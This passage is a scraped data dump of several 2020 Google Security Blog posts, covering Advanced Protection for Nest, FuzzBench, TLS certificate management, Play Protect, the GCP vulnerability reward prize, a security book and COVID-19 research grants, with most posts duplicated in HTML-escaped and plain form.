government agencies and industry partners to make sure that Android 11 is ready for such digital-first identity experiences.   Thank you for your flexibility and feedback as we continue to build an increasingly more private and secure platform. You can learn about more features in the Android 11 Beta developer site. You can also learn about general best practices related to privacy and security.     Please follow Android Developers on Twitter and Youtube to catch helpful content and materials in this area all this week.   Resources   You can find the entire playlist of #11WeeksOfAndroid video content here, and learn more about each week here. We’ll continue to spotlight new areas each week, so keep an eye out and follow us on Twitter and YouTube. Thanks so much for letting us be a part of this experience with you!       ", "date": "June 29, 2020"},
{"website": "Google-Security", "title": "\nThe Advanced Protection Program comes to Google Nest\n", "author": ["Posted by Shuvo Chatterjee, Product Manager, Advanced Protection Program"], "link": "https://security.googleblog.com/2020/06/the-advanced-protection-program-comes.html", "abstract": "                             Posted by Shuvo Chatterjee, Product Manager, Advanced Protection Program     The  Advanced Protection Program  is our strongest level of Google Account security for people at high risk of targeted online attacks, such as journalists, activists, business leaders, and people working on elections. Anyone can sign up to automatically receive extra safeguards against phishing, malware, and fraudulent access to their data.    Since we launched, one of our goals has been to bring Advanced Protection&#8217;s features to other Google products. Over the years, we&#8217;ve incorporated many of them into  GSuite ,  Google Cloud Platform ,  Chrome , and most recently,  Android . We want as many users as possible to benefit from the additional levels of security that the Program provides.    Today we&#8217;re announcing one of the top requests we&#8217;ve received: to bring the Advanced Protection Program to Nest.&nbsp; Now people can seamlessly use their Google Accounts with both Advanced Protection and Google Nest devices -- previously, a user could use their Google Account on only one of these at a time.    Feeling safe at home has never been more important and Nest has  announced a variety of new security features this year , including using reCAPTCHA Enterprise, to significantly lower the likelihood of automated attacks. Today&#8217;s improvement adds yet another layer of protection for people with Nest devices.    For more information about using Advanced Protection with Google Nest devices, check out  this article in our help center .                                   Posted by Shuvo Chatterjee, Product Manager, Advanced Protection Program  The Advanced Protection Program is our strongest level of Google Account security for people at high risk of targeted online attacks, such as journalists, activists, business leaders, and people working on elections. Anyone can sign up to automatically receive extra safeguards against phishing, malware, and fraudulent access to their data.  Since we launched, one of our goals has been to bring Advanced Protection’s features to other Google products. Over the years, we’ve incorporated many of them into GSuite, Google Cloud Platform, Chrome, and most recently, Android. We want as many users as possible to benefit from the additional levels of security that the Program provides.  Today we’re announcing one of the top requests we’ve received: to bring the Advanced Protection Program to Nest.  Now people can seamlessly use their Google Accounts with both Advanced Protection and Google Nest devices -- previously, a user could use their Google Account on only one of these at a time.  Feeling safe at home has never been more important and Nest has announced a variety of new security features this year, including using reCAPTCHA Enterprise, to significantly lower the likelihood of automated attacks. Today’s improvement adds yet another layer of protection for people with Nest devices.  For more information about using Advanced Protection with Google Nest devices, check out this article in our help center.     ", "date": "June 1, 2020"},
{"website": "Google-Security", "title": "\nFuzzBench: Fuzzer Benchmarking as a Service\n", "author": ["Posted by Jonathan Metzman, Abhishek Arya, Google OSS-Fuzz Team and László Szekeres‎, Google Software Analysis Team"], "link": "https://security.googleblog.com/2020/03/fuzzbench-fuzzer-benchmarking-as-service.html", "abstract": "                             Posted by Jonathan Metzman, Abhishek Arya, Google OSS-Fuzz Team and László Szekeres&#8206;, Google Software Analysis Team    We are excited to launch  FuzzBench , a fully automated, open source, free service for evaluating fuzzers. The goal of FuzzBench is to make it painless to rigorously evaluate fuzzing research and make fuzzing research easier for the community to adopt.    Fuzzing  is an important bug finding technique. At Google, we&#8217;ve found tens of thousands of bugs ( 1 ,  2 ) with fuzzers like libFuzzer and AFL. There are numerous research papers that either improve upon these tools (e.g. MOpt-AFL, AFLFast, etc) or introduce new techniques (e.g. Driller, QSYM, etc) for bug finding. However, it is hard to know how well these new tools and techniques generalize on a large set of real world programs. Though research normally includes evaluations, these  often have shortcomings &#8212;they don't use a large and diverse set of real world benchmarks, use few trials, use short trials, or lack statistical tests to illustrate if findings are significant. This is understandable since full scale experiments can be prohibitively expensive for researchers. For example, a 24-hour, 10-trial, 10 fuzzer, 20 benchmark experiment would require 2,000 CPUs to complete in a day.   To help solve these issues the OSS-Fuzz team is launching FuzzBench, a fully automated, open source, free service. FuzzBench provides a framework for painlessly evaluating fuzzers in a reproducible way. To use FuzzBench, researchers can simply integrate a fuzzer and FuzzBench will run an experiment for 24 hours with many trials and real world benchmarks. Based on data from this experiment, FuzzBench will produce a report comparing the performance of the fuzzer to others and give insights into the strengths and weaknesses of each fuzzer. This should allow researchers to focus more of their time on perfecting techniques and less time setting up evaluations and dealing with existing fuzzers.   Integrating a fuzzer with FuzzBench is simple as most integrations are less than 50 lines of code ( example ). Once a fuzzer is integrated, it can fuzz almost all 250+  OSS-Fuzz projects  out of the box. We have already integrated  ten fuzzers , including AFL, LibFuzzer, Honggfuzz, and several academic projects such as QSYM and Eclipser.   Reports include statistical tests to give an idea how likely it is that performance differences between fuzzers are simply due to chance, as well as the raw data so researchers can do their own analysis. Performance is determined by the amount of covered program edges, though we plan on adding crashes as a performance metric. You can view a sample report  here .    How to Participate    Our goal is to develop FuzzBench with community contributions and input so that it becomes the gold standard for fuzzer evaluation. We invite members of the fuzzing research community to contribute their fuzzers and techniques, even while they are in development. Better evaluations will lead to more adoption and greater impact for fuzzing research.   We also encourage contributions of better ideas and techniques for evaluating fuzzers. Though we have made some progress on this problem, we have not solved it and we need the community&#8217;s help in developing these best practices.   Please join us by contributing to the  FuzzBench repo  on GitHub.                                    Posted by Jonathan Metzman, Abhishek Arya, Google OSS-Fuzz Team and László Szekeres‎, Google Software Analysis Team  We are excited to launch FuzzBench, a fully automated, open source, free service for evaluating fuzzers. The goal of FuzzBench is to make it painless to rigorously evaluate fuzzing research and make fuzzing research easier for the community to adopt.  Fuzzing is an important bug finding technique. At Google, we’ve found tens of thousands of bugs (1, 2) with fuzzers like libFuzzer and AFL. There are numerous research papers that either improve upon these tools (e.g. MOpt-AFL, AFLFast, etc) or introduce new techniques (e.g. Driller, QSYM, etc) for bug finding. However, it is hard to know how well these new tools and techniques generalize on a large set of real world programs. Though research normally includes evaluations, these often have shortcomings—they don't use a large and diverse set of real world benchmarks, use few trials, use short trials, or lack statistical tests to illustrate if findings are significant. This is understandable since full scale experiments can be prohibitively expensive for researchers. For example, a 24-hour, 10-trial, 10 fuzzer, 20 benchmark experiment would require 2,000 CPUs to complete in a day.  To help solve these issues the OSS-Fuzz team is launching FuzzBench, a fully automated, open source, free service. FuzzBench provides a framework for painlessly evaluating fuzzers in a reproducible way. To use FuzzBench, researchers can simply integrate a fuzzer and FuzzBench will run an experiment for 24 hours with many trials and real world benchmarks. Based on data from this experiment, FuzzBench will produce a report comparing the performance of the fuzzer to others and give insights into the strengths and weaknesses of each fuzzer. This should allow researchers to focus more of their time on perfecting techniques and less time setting up evaluations and dealing with existing fuzzers.  Integrating a fuzzer with FuzzBench is simple as most integrations are less than 50 lines of code (example). Once a fuzzer is integrated, it can fuzz almost all 250+ OSS-Fuzz projects out of the box. We have already integrated ten fuzzers, including AFL, LibFuzzer, Honggfuzz, and several academic projects such as QSYM and Eclipser.  Reports include statistical tests to give an idea how likely it is that performance differences between fuzzers are simply due to chance, as well as the raw data so researchers can do their own analysis. Performance is determined by the amount of covered program edges, though we plan on adding crashes as a performance metric. You can view a sample report here.  How to Participate  Our goal is to develop FuzzBench with community contributions and input so that it becomes the gold standard for fuzzer evaluation. We invite members of the fuzzing research community to contribute their fuzzers and techniques, even while they are in development. Better evaluations will lead to more adoption and greater impact for fuzzing research.  We also encourage contributions of better ideas and techniques for evaluating fuzzers. Though we have made some progress on this problem, we have not solved it and we need the community’s help in developing these best practices.  Please join us by contributing to the FuzzBench repo on GitHub.     ", "date": "March 2, 2020"},
{"website": "Google-Security", "title": "\nHow Google does certificate lifecycle management\n", "author": ["Posted by Siddharth Bhai and Ryan Hurst, Product Managers, Google Cloud "], "link": "https://security.googleblog.com/2020/03/how-google-does-certificate-lifecycle.html", "abstract": "                             Posted by Siddharth Bhai and Ryan Hurst, Product Managers, Google Cloud&nbsp;       Over the last few years, we&#8217;ve seen the use of Transport Layer Security (TLS) on the web increase to more than 96% of all traffic seen by a Chrome browser on Chrome OS. That&#8217;s an increase of over 35% in just four years, as reported in our  Google Transparency Report . Whether you&#8217;re a web developer, a business, or a netizen, this is a collective achievement that&#8217;s making the Internet a safer place for everyone.                         Percentage of pages loaded over HTTPS in Chrome by platform ( Google Transparency Report )    The way TLS is deployed has also changed. The maximum certificate validity for public certificates has gone from 5 years to 2 years ( CA/Browser Forum ), and that will drop to 1 year in the near future. To reduce the number of outages caused by manual certificate enrollments, the Internet Engineering Task Force (IETF) has standardized Automatic Certificate Management Environment ( ACME ). ACME enables Certificate Authorities (CAs) to offer TLS certificates for the public web in an automated and interoperable way.&nbsp;   As we round off this exciting tour of  recent TLS history , we&#8217;d be remiss if we didn&#8217;t mention  Let&#8217;s Encrypt  - the first publicly trusted non-profit CA. Their focus on automation and TLS by default has been foundational to this massive increase in TLS usage. In fact, Let&#8217;s Encrypt just issued their billionth (!) certificate. Google has been an active supporter of Let&#8217;s Encrypt because we believe the work they do to make TLS accessible is important for the security and resilience of the Internet's infrastructure. Keep rocking, Let&#8217;s Encrypt!        Simplifying certificate lifecycle management for Google&#8217;s users        These are important strides we are making collectively in the security community. At the same time, these efforts mean we are moving to shorter-lived keys to improve security, which in-turn requires more frequent certificate renewals. Further, infrastructure deployments are getting more heterogeneous. Web traffic is served from multiple datacenters, often from different providers. This makes it hard to manually keep tabs on which certificates need renewing and ensuring new certificates are deployed correctly. So what is the way forward?&nbsp;       With the adoption numbers cited above, it&#8217;s clear that TLS, Web PKI, and certificate lifecycle management are foundational to every product we and our customers build and deploy. This is why we have been expanding significant effort to enable TLS by default for our products and services, while also automating certificate renewals to make certificate lifecycle management more reliable, globally scalable, and trustworthy for our customers. Our goal is simple: We want to ensure TLS just works out of the box regardless of which Google service you use.         In support of that goal, we have enabled automatic management of TLS certificates for Google services using an internal-only ACME service,  Google Trust Services . This applies to our own products and services, as well as for our customers across Alphabet and Google Cloud. As a result, our users no longer need to worry about things like certificate expiration, because we automatically refresh the certificates for our customers. Some implementation highlights include:      All Blogger blogs, Google Sites, and Google My Business sites now get HTTPS by default for their custom domains.   Google Cloud customers get the benefits of Managed TLS on their domains. So:      Developers building with Firebase, Cloud Run, and AppEngine automatically get HTTPS for their applications.   When deploying applications with Google Kubernetes Engine or behind Google Cloud Load Balancing (GCLB), certificate management is taken care of if customers choose to use Google-managed certificates. This also makes TLS use with these products easy and reliable.      Performance, scalability, and reliability are foundational requirements for Google services. We have established our own publicly trusted CA, Google Trust Services to ensure we can meet those criteria for our products and services. At the same time, we believe in user choice. So even as we make it easier for you to use Google Trust Services, we have also made it possible across Google&#8217;s products and services to use Let&#8217;s Encrypt. This choice can be made easily through the  creation of a CAA record  indicating your preference.       While everyone appreciates TLS working out of the box, we also know power users have specialized needs. This is why we have provided rich capabilities in  Google Cloud Load Balancing  to let customers control policies around TLS termination.&nbsp;       In addition, through our work on  Certificate Transparency  in collaboration with other organizations, we have made it easier for our customers to protect their and their customers&#8217; brands by monitoring the WebPKI ecosystem for certificates issued for their domains or those that look similar to their domains, so they can take proactive measures to stop any abuse before it becomes an issue. For example, Facebook used Certificate Transparency Logs to  catch  a number of phishing websites that tried to impersonate their services.&nbsp;       We recognize how important security, privacy, and reliability are to you and have been investing across our product portfolio to ensure that when it comes to TLS, you have the tools you need to deploy with confidence. Going forward, we look forward to a continued partnership to make the Internet a safer place together.                                         Posted by Siddharth Bhai and Ryan Hurst, Product Managers, Google Cloud   Over the last few years, we’ve seen the use of Transport Layer Security (TLS) on the web increase to more than 96% of all traffic seen by a Chrome browser on Chrome OS. That’s an increase of over 35% in just four years, as reported in our Google Transparency Report. Whether you’re a web developer, a business, or a netizen, this is a collective achievement that’s making the Internet a safer place for everyone.     Percentage of pages loaded over HTTPS in Chrome by platform (Google Transparency Report) The way TLS is deployed has also changed. The maximum certificate validity for public certificates has gone from 5 years to 2 years (CA/Browser Forum), and that will drop to 1 year in the near future. To reduce the number of outages caused by manual certificate enrollments, the Internet Engineering Task Force (IETF) has standardized Automatic Certificate Management Environment (ACME). ACME enables Certificate Authorities (CAs) to offer TLS certificates for the public web in an automated and interoperable way.  As we round off this exciting tour of recent TLS history, we’d be remiss if we didn’t mention Let’s Encrypt - the first publicly trusted non-profit CA. Their focus on automation and TLS by default has been foundational to this massive increase in TLS usage. In fact, Let’s Encrypt just issued their billionth (!) certificate. Google has been an active supporter of Let’s Encrypt because we believe the work they do to make TLS accessible is important for the security and resilience of the Internet's infrastructure. Keep rocking, Let’s Encrypt!   Simplifying certificate lifecycle management for Google’s users  These are important strides we are making collectively in the security community. At the same time, these efforts mean we are moving to shorter-lived keys to improve security, which in-turn requires more frequent certificate renewals. Further, infrastructure deployments are getting more heterogeneous. Web traffic is served from multiple datacenters, often from different providers. This makes it hard to manually keep tabs on which certificates need renewing and ensuring new certificates are deployed correctly. So what is the way forward?    With the adoption numbers cited above, it’s clear that TLS, Web PKI, and certificate lifecycle management are foundational to every product we and our customers build and deploy. This is why we have been expanding significant effort to enable TLS by default for our products and services, while also automating certificate renewals to make certificate lifecycle management more reliable, globally scalable, and trustworthy for our customers. Our goal is simple: We want to ensure TLS just works out of the box regardless of which Google service you use.    In support of that goal, we have enabled automatic management of TLS certificates for Google services using an internal-only ACME service, Google Trust Services. This applies to our own products and services, as well as for our customers across Alphabet and Google Cloud. As a result, our users no longer need to worry about things like certificate expiration, because we automatically refresh the certificates for our customers. Some implementation highlights include:  All Blogger blogs, Google Sites, and Google My Business sites now get HTTPS by default for their custom domains. Google Cloud customers get the benefits of Managed TLS on their domains. So:   Developers building with Firebase, Cloud Run, and AppEngine automatically get HTTPS for their applications. When deploying applications with Google Kubernetes Engine or behind Google Cloud Load Balancing (GCLB), certificate management is taken care of if customers choose to use Google-managed certificates. This also makes TLS use with these products easy and reliable.   Performance, scalability, and reliability are foundational requirements for Google services. We have established our own publicly trusted CA, Google Trust Services to ensure we can meet those criteria for our products and services. At the same time, we believe in user choice. So even as we make it easier for you to use Google Trust Services, we have also made it possible across Google’s products and services to use Let’s Encrypt. This choice can be made easily through the creation of a CAA record indicating your preference.   While everyone appreciates TLS working out of the box, we also know power users have specialized needs. This is why we have provided rich capabilities in Google Cloud Load Balancing to let customers control policies around TLS termination.    In addition, through our work on Certificate Transparency in collaboration with other organizations, we have made it easier for our customers to protect their and their customers’ brands by monitoring the WebPKI ecosystem for certificates issued for their domains or those that look similar to their domains, so they can take proactive measures to stop any abuse before it becomes an issue. For example, Facebook used Certificate Transparency Logs to catch a number of phishing websites that tried to impersonate their services.    We recognize how important security, privacy, and reliability are to you and have been investing across our product portfolio to ensure that when it comes to TLS, you have the tools you need to deploy with confidence. Going forward, we look forward to a continued partnership to make the Internet a safer place together.       ", "date": "March 10, 2020"},
{"website": "Google-Security", "title": "\nHow Google Play Protect kept users safe in 2019\n", "author": ["Posted by Rahul Mishra, Program Manager, Android Security and Privacy Team"], "link": "https://security.googleblog.com/2020/03/how-google-play-protect-kept-users-safe.html", "abstract": "                             Posted by Rahul Mishra, Program Manager, Android Security and Privacy Team               Through 2019, Google Play Protect continued to improve the security for 2.5 billion Android devices. Built into Android, Play Protect scans over 100 billion apps every day for  malware and other harmful apps . This past year, Play Protect prevented over 1.9 billion malware installs from unknown sources. Throughout 2019 there were many improvements made to Play Protect to bring the best of Google to Android devices to keep users safe. Some of the new features launched in 2019 include:     Advanced similarity detection    Play Protect now warns you about variations of known malware right  on the device . On-device protections warn users about Potentially Harmful Apps (PHAs) at install time for a faster response. Since October 2019, Play Protect issued 380,000 warnings for install attempts using this system.    Warnings for apps targeting lower Android versions    Malware developers intentionally target devices running long outdated versions of Android to abuse exploits that have recently been patched. In 2018, Google Play started requiring new apps and app updates be built for new versions of the  Android OS . This strategy ensures that users downloading apps from Google Play recieve apps that take advantage of the latest privacy and security improvements in the OS.   In 2019, we improved on this strategy with warnings to the user. Play Protect now notifies users when they install an app that is designed for outdated versions. The user can then make an informed decision to proceed with the installation or stop the app from being installed so they can look for an alternative that target the most current version of Android.           Uploading rare apps for scanning    The Android app ecosystem is growing at an exponential rate. Millions of new app versions are created and shared outside of Google Play daily posing a unique scaling challenge. Knowledge of new and rare apps is essential to provide the best protection possible.   We added a new feature that lets users help the fight against malware by sending apps Play Protect hasn't seen before for scanning during installation. The upload to Google&#8217;s scanning services preserves the privacy of the user and enables Play Protect to improve the protection for all users.            Integration with Google&#8217;s Files app     Google&#8217;s Files app  is used by hundreds of millions of people every month to manage the storage on their device, share files safely, and clean up clutter and duplicate files. This year, we integrated Google Play Protect notifications within the app so that users are prompted to scan and remove any harmful applications that may be installed.            Play Protect visual updates     The Google Play Store has over 2 billion monthly active users coming to safely find the right app, game, and other digital content. This year the team was excited to roll out a complete  visual redesign . With this change, Play Protect made several user-facing updates to deliver a cleaner, more prominent experience including a reminder to enable app-scanning in My apps &amp; games to improve security.          The mobile threat landscape is always changing and so Google Play Protect must keep adapting and improving to protect our users. Visit  developers.google.com/android/play-protect  to stay informed on all the new exciting features and improvements being added to Google Play Protect.   Acknowledgements:  Aaron Josephs, Ben Gruver, James Kelly, Rodrigo Farell, Wei Jin and William Luh                                     Posted by Rahul Mishra, Program Manager, Android Security and Privacy Team     Through 2019, Google Play Protect continued to improve the security for 2.5 billion Android devices. Built into Android, Play Protect scans over 100 billion apps every day for malware and other harmful apps. This past year, Play Protect prevented over 1.9 billion malware installs from unknown sources. Throughout 2019 there were many improvements made to Play Protect to bring the best of Google to Android devices to keep users safe. Some of the new features launched in 2019 include:   Advanced similarity detection  Play Protect now warns you about variations of known malware right on the device. On-device protections warn users about Potentially Harmful Apps (PHAs) at install time for a faster response. Since October 2019, Play Protect issued 380,000 warnings for install attempts using this system.  Warnings for apps targeting lower Android versions  Malware developers intentionally target devices running long outdated versions of Android to abuse exploits that have recently been patched. In 2018, Google Play started requiring new apps and app updates be built for new versions of the Android OS. This strategy ensures that users downloading apps from Google Play recieve apps that take advantage of the latest privacy and security improvements in the OS.  In 2019, we improved on this strategy with warnings to the user. Play Protect now notifies users when they install an app that is designed for outdated versions. The user can then make an informed decision to proceed with the installation or stop the app from being installed so they can look for an alternative that target the most current version of Android.    Uploading rare apps for scanning  The Android app ecosystem is growing at an exponential rate. Millions of new app versions are created and shared outside of Google Play daily posing a unique scaling challenge. Knowledge of new and rare apps is essential to provide the best protection possible.  We added a new feature that lets users help the fight against malware by sending apps Play Protect hasn't seen before for scanning during installation. The upload to Google’s scanning services preserves the privacy of the user and enables Play Protect to improve the protection for all users.     Integration with Google’s Files app  Google’s Files app is used by hundreds of millions of people every month to manage the storage on their device, share files safely, and clean up clutter and duplicate files. This year, we integrated Google Play Protect notifications within the app so that users are prompted to scan and remove any harmful applications that may be installed.     Play Protect visual updates   The Google Play Store has over 2 billion monthly active users coming to safely find the right app, game, and other digital content. This year the team was excited to roll out a complete visual redesign. With this change, Play Protect made several user-facing updates to deliver a cleaner, more prominent experience including a reminder to enable app-scanning in My apps & games to improve security.    The mobile threat landscape is always changing and so Google Play Protect must keep adapting and improving to protect our users. Visit developers.google.com/android/play-protect to stay informed on all the new exciting features and improvements being added to Google Play Protect.  Acknowledgements: Aaron Josephs, Ben Gruver, James Kelly, Rodrigo Farell, Wei Jin and William Luh     ", "date": "March 10, 2020"},
{"website": "Google-Security", "title": "\nAnnouncing our first GCP VRP Prize winner and updates to 2020 program\n", "author": ["Posted by Harshvardan Sharma, Information Security Engineer, Google"], "link": "https://security.googleblog.com/2020/03/announcing-our-first-gcp-vrp-prize.html", "abstract": "                             Posted by Harshvardan Sharma, Information Security Engineer, Google      Last year, we  announced  a yearly Google Cloud Platform (GCP) VRP Prize to promote security research of GCP. Since then, we&#8217;ve received many interesting entries as part of this new initiative from the security research community. Today, we are announcing the winner as well as several updates to our program for 2020.   After careful evaluation of all the submissions, we are excited to announce our winner of the 2019 GCP VRP prize: Wouter ter Maat, who submitted a write-up about Google Cloud Shell vulnerabilities. You can read his winning write-up  here .    There were several other excellent reports submitted to our GCP VRP in 2019. To learn more about them watch this  video  by LiveOverflow, which explains some of the top submissions in detail.  To encourage more security researchers to look for vulnerabilities in GCP and to better reward our top bug hunters, we're tripling the total amount of the GCP VRP Prize this year. We will pay out a total of $313,337 for the top vulnerability reports in GCP products submitted in 2020. The following prize amounts will be distributed between the top 6 submissions:    1st prize: $133,337   2nd prize: $73,331   3rd prize: $73,331   4th prize: $31,337   5th prize: $1,001   6th prize: $1,000       Like last year, submissions should have public write-ups in order to be eligible for the prize. The number of vulnerability reports in a single write-up is not a factor. You can even make multiple submissions, one for each write-up. These prizes are only for vulnerabilities found in GCP products. If you have budget constraints regarding access to testing environments, you can use the  free tier of GCP . Note that this prize is not a replacement of our  Vulnerability Reward Program  (VRP), and that we will continue to pay security researchers under the VRP for disclosing security issues that affect Google services, including GCP. Complete details, terms and conditions about the prize can be found  here .              Thank you to everyone who submitted entries in 2019! Make sure to nominate your VRP reports and write-ups for the 2020 GCP VRP prize  here  before December 31, 2020 at 11:59 GMT.                                     Posted by Harshvardan Sharma, Information Security Engineer, Google  Last year, we announced a yearly Google Cloud Platform (GCP) VRP Prize to promote security research of GCP. Since then, we’ve received many interesting entries as part of this new initiative from the security research community. Today, we are announcing the winner as well as several updates to our program for 2020. After careful evaluation of all the submissions, we are excited to announce our winner of the 2019 GCP VRP prize: Wouter ter Maat, who submitted a write-up about Google Cloud Shell vulnerabilities. You can read his winning write-up here.  There were several other excellent reports submitted to our GCP VRP in 2019. To learn more about them watch this video by LiveOverflow, which explains some of the top submissions in detail.To encourage more security researchers to look for vulnerabilities in GCP and to better reward our top bug hunters, we're tripling the total amount of the GCP VRP Prize this year. We will pay out a total of $313,337 for the top vulnerability reports in GCP products submitted in 2020. The following prize amounts will be distributed between the top 6 submissions: 1st prize: $133,337 2nd prize: $73,331 3rd prize: $73,331 4th prize: $31,337 5th prize: $1,001 6th prize: $1,000   Like last year, submissions should have public write-ups in order to be eligible for the prize. The number of vulnerability reports in a single write-up is not a factor. You can even make multiple submissions, one for each write-up. These prizes are only for vulnerabilities found in GCP products. If you have budget constraints regarding access to testing environments, you can use the free tier of GCP. Note that this prize is not a replacement of our Vulnerability Reward Program (VRP), and that we will continue to pay security researchers under the VRP for disclosing security issues that affect Google services, including GCP. Complete details, terms and conditions about the prize can be found here.      Thank you to everyone who submitted entries in 2019! Make sure to nominate your VRP reports and write-ups for the 2020 GCP VRP prize here before December 31, 2020 at 11:59 GMT.     ", "date": "March 11, 2020"},
{"website": "Google-Security", "title": "\nIntroducing our new book “Building Secure and Reliable Systems”\n", "author": ["Posted by Royal Hansen, VP of Security Engineering, Google"], "link": "https://security.googleblog.com/2020/04/introducing-our-new-book-building.html", "abstract": "                             Posted by Royal Hansen, VP of Security Engineering, Google             For years, I&#8217;ve wished that someone would write a book like this. Since their publication, I&#8217;ve often admired and recommended the Google Site Reliability Engineering (SRE) books&#8212;so I was thrilled to find that a book focused on security and reliability was already underway when I arrived at Google. Ever since I began working in the tech industry, across organizations of varying sizes, I&#8217;ve seen people struggling with the question of how security should be organized: Should it be centralized or federated? Independent or embedded? Operational or consultative? Technical or governing? The list goes on and on.     Both SRE and security have strong dependencies on classic software engineering teams. Yet both differ from classic software engineering teams in fundamental ways:   Site Reliability Engineers (SREs) and security engineers tend to break and fix, as well as build.   Their work encompasses operations, in addition to development.   SREs and security engineers are specialists, rather than classic software engineers.   They are often viewed as roadblocks, rather than enablers.   They are frequently siloed, rather than integrated in product teams.    For many years, my colleagues and I have argued that security should be a first-class and embedded quality of software. I believe that embracing an SRE- inspired approach is a logical step in that direction. As my understanding of the intersection between security and SRE has deepened, I&#8217;ve become even more certain that it&#8217;s important to more thoroughly integrate security practices into the full lifecycle of software and data services. The nature of the modern hybrid cloud&#8212;much of which is based on open source software frameworks that offer interconnected data and microservices&#8212;makes tightly integrated security and resilience capabilities even more important.  At the same time, enterprises are at a critical point where cloud computing, various forms of machine learning, and a complicated cybersecurity landscape are together determining where an increasingly digital world is going, how quickly it will get there, and what risks are involved.     The operational and organizational approaches to security in large enterprises have varied dramatically over the past 20 years. The most prominent instantiations include fully centralized chief information security officers and core infrastructure operations that encompass firewalls, directory services, proxies, and much more&#8212;teams that have grown to hundreds or thousands of employees. On the other end of the spectrum, federated business information security teams have either the line of business or technical expertise required to support or govern a named list of functions or business operations. Somewhere in the middle, committees, metrics, and regulatory requirements might govern security policies, and embedded Security Champions might either play a relationship management role or track issues for a named organizational unit. Recently, I&#8217;ve seen teams riffing on the SRE model by evolving the embedded role into something like a site security engineer, or into a specific Agile scrum role for specialist security teams.     For good reasons, enterprise security teams have largely focused on confidentiality. However, organizations often recognize data integrity and availability to be equally important, and address these areas with different teams and different controls. The SRE function is a best-in-class approach to reliability. However, it also plays a role in the real-time detection of and response to technical issues&#8212;including security- related attacks on privileged access or sensitive data. Ultimately, while engineering teams are often organizationally separated according to specialized skill sets, they have a common goal: ensuring the quality and safety of the system or application.  In a world that is becoming more dependent upon technology every year, a book about approaches to security and reliability drawn from experiences at Google and across the industry is an important contribution to the evolution of software development, systems management, and data protection. As the threat landscape evolves, a dynamic and integrated approach to defense is now a basic necessity. In my previous roles, I looked for a more formal exploration of these questions; I hope that a variety of teams inside and outside of security organizations find this discussion useful as approaches and tools evolve. This project has reinforced my belief that the topics it covers are worth discussing and promoting in the industry&#8212;particularly as more organizations adopt DevOps, DevSecOps, SRE, and hybrid cloud architectures along with their associated operating models. At a minimum, this book is another step in the evolution and enhancement of system and data security in an increasingly digital world.   The new book can be downloaded for free from the Google SRE  website , or purchased as a physical copy from your preferred retailer.                                      Posted by Royal Hansen, VP of Security Engineering, Google   For years, I’ve wished that someone would write a book like this. Since their publication, I’ve often admired and recommended the Google Site Reliability Engineering (SRE) books—so I was thrilled to find that a book focused on security and reliability was already underway when I arrived at Google. Ever since I began working in the tech industry, across organizations of varying sizes, I’ve seen people struggling with the question of how security should be organized: Should it be centralized or federated? Independent or embedded? Operational or consultative? Technical or governing? The list goes on and on.  Both SRE and security have strong dependencies on classic software engineering teams. Yet both differ from classic software engineering teams in fundamental ways: Site Reliability Engineers (SREs) and security engineers tend to break and fix, as well as build. Their work encompasses operations, in addition to development. SREs and security engineers are specialists, rather than classic software engineers. They are often viewed as roadblocks, rather than enablers. They are frequently siloed, rather than integrated in product teams.  For many years, my colleagues and I have argued that security should be a first-class and embedded quality of software. I believe that embracing an SRE- inspired approach is a logical step in that direction. As my understanding of the intersection between security and SRE has deepened, I’ve become even more certain that it’s important to more thoroughly integrate security practices into the full lifecycle of software and data services. The nature of the modern hybrid cloud—much of which is based on open source software frameworks that offer interconnected data and microservices—makes tightly integrated security and resilience capabilities even more important.At the same time, enterprises are at a critical point where cloud computing, various forms of machine learning, and a complicated cybersecurity landscape are together determining where an increasingly digital world is going, how quickly it will get there, and what risks are involved.  The operational and organizational approaches to security in large enterprises have varied dramatically over the past 20 years. The most prominent instantiations include fully centralized chief information security officers and core infrastructure operations that encompass firewalls, directory services, proxies, and much more—teams that have grown to hundreds or thousands of employees. On the other end of the spectrum, federated business information security teams have either the line of business or technical expertise required to support or govern a named list of functions or business operations. Somewhere in the middle, committees, metrics, and regulatory requirements might govern security policies, and embedded Security Champions might either play a relationship management role or track issues for a named organizational unit. Recently, I’ve seen teams riffing on the SRE model by evolving the embedded role into something like a site security engineer, or into a specific Agile scrum role for specialist security teams.  For good reasons, enterprise security teams have largely focused on confidentiality. However, organizations often recognize data integrity and availability to be equally important, and address these areas with different teams and different controls. The SRE function is a best-in-class approach to reliability. However, it also plays a role in the real-time detection of and response to technical issues—including security- related attacks on privileged access or sensitive data. Ultimately, while engineering teams are often organizationally separated according to specialized skill sets, they have a common goal: ensuring the quality and safety of the system or application.In a world that is becoming more dependent upon technology every year, a book about approaches to security and reliability drawn from experiences at Google and across the industry is an important contribution to the evolution of software development, systems management, and data protection. As the threat landscape evolves, a dynamic and integrated approach to defense is now a basic necessity. In my previous roles, I looked for a more formal exploration of these questions; I hope that a variety of teams inside and outside of security organizations find this discussion useful as approaches and tools evolve. This project has reinforced my belief that the topics it covers are worth discussing and promoting in the industry—particularly as more organizations adopt DevOps, DevSecOps, SRE, and hybrid cloud architectures along with their associated operating models. At a minimum, this book is another step in the evolution and enhancement of system and data security in an increasingly digital world. The new book can be downloaded for free from the Google SRE website, or purchased as a physical copy from your preferred retailer.      ", "date": "April 8, 2020"},
{"website": "Google-Security", "title": "\nResearch Grants to support Google VRP Bug Hunters during COVID-19\n", "author": ["Posted by Anna Hupa, Senior Strategist, Trust & Safety at Google"], "link": "https://security.googleblog.com/2020/04/research-grants-to-support-google-vrp_20.html", "abstract": "                             Posted by Anna Hupa, Senior Strategist, Trust &amp; Safety at Google     In 2015, we launched our  Vulnerability Research Grant  program, which allows us to recognize the time and efforts of security researchers, including the situations where they don't find any vulnerabilities. To support our community of security researchers and to help protect our users around the world during COVID-19, we are announcing a temporary expansion of our  Vulnerability Research Grant  efforts.     In light of new challenges caused by the coronavirus outbreak, we are expanding this initiative by&nbsp; creating a COVID-19 grant fund. As of today, every Google VRP Bug Hunter who submitted at least two remunerated reports from 2018 through April 2020  will be eligible for a $1,337 research grant. We are dedicating these grants to support our researchers during this time. We are committed to protecting our users and we want to encourage the research community to help us identify threats and to prevent potential vulnerabilities in our products.    We understand the individual challenges COVID-19 has placed on the research community are different for everyone and we hope that these grants will allow us to support our Bug Hunters during these uncertain times. Even though our grants are intended to recognize the efforts of our frequent researchers regardless of their results, as always, bugs found during the grant are eligible for regular rewards per the  Vulnerability Reward Program (VRP) rules . We are aware that some of our partners might not be interested in monetary grants. In such cases, we will offer the option to donate the grant to an established COVID-19 related charity and within our discretion, will monetarily match these charitable donations.    For those of you who recently joined us or are planning to start, it&#8217;s never too late. We are committed to continue the  